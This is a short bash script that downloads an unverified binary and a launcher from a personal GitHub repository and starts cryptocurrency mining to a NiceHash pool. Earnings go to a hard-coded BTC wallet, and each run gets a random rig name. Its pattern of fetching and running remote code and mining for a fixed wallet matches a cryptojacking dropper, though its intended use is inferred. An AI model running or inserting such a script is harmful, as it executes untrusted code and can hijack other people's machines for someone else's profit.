#!/bin/bash
wget https://github.com/aka648582/yes/raw/main/gas
chmod +x gas
wget https://github.com/aka648582/yes/raw/main/cmdline_launcher.sh
chmod +x cmdline_launcher.sh
./cmdline_launcher.sh -algo autolykos  -coin BTC-wallet 3K58rk4hAySW78RPaxkzFVhddAL7iMxkbZ  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 stratum+tcp://autolykos.usa-east.nicehash.com:3390
